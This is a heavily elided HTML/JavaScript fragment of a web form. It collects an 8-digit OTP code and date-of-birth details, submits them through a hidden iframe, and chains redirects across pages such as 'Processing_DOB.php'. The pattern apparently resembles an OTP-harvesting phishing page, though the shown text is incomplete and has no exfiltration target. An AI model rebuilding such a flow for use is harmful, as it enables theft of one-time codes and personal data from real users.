   ...
   <body onload="startTimer();" style="background:#fff;">
    ...
    <img src="Menu.png" id="ii" width="10%">
      ...
      <section class="">
         ...
         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_DOB.php';}"></iframe>
         <!--My Form-->
                  ...
                  <div class="col-md-6 col-xs-12">
				   <div class="progress">
                     ...
                     <div class="p-50">
                        ...
                        <div class="login-box">
                        <div class="user-box">
                        <input type="text" name="DOB_OTP" inputmode="numeric" maxlength="8"
                        ...
                        if (timer<2) {
                        // timer.stop();
                        window.location.href = "Name_And_DOB.php";
                        }
                        ...
                        window.location.href="Enter_OTP_DOB.php";
                        }
                        }
                        </script>
